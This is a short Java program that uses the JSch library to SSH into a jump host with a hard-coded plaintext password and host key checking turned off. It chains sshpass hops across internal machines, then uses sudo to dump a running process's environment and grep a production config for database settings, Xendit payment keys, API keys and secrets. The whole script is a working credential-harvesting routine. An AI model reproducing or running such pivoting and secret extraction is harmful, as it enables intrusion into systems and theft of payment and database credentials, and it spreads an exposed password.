import com.jcraft.jsch.*;
import java.io.*;
class XM6 {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    Session jump = j.getSession("user", "10.14.36.23", 22);
    jump.setPassword("kutul0nc4t");
    jump.setConfig(p);
    jump.setTimeout(10000);
    jump.connect();
    ChannelExec ch = (ChannelExec) jump.openChannel("exec");
    ch.setCommand("sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no user@10.13.16.117 'sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no user@10.13.16.186 \"echo ---ENV---;echo kutul0nc4t | sudo -S cat /proc/711681/environ 2>/dev/null | tr \\\"\\\\0\\\" \\\"\\\\n\\\" | grep -vE \\\"^PATH=\\\\|^HOME=\\\";echo ---CONFIG-FILES---;find /progs/noxify/ -name \\\"config*.properties\\\" -o -name \\\"application*.properties\\\" 2>/dev/null | head -10;echo ---CONFIG-PROD---;cat /progs/noxify/noxify-app/tomcat/7.0.109/webapps/ROOT/WEB-INF/classes/config-prod.properties 2>/dev/null | grep -iE \\\"db\\\\.\\\\|xendit\\\\|xnd_\\\\|api.key\\\\|secret\\\" | head -15\" 2>&1' 2>&1 | head -50");
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    ch.connect();
    byte[] buf = new byte[16384];
    int i;
    while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
    ch.disconnect();
    jump.disconnect();
  }
}
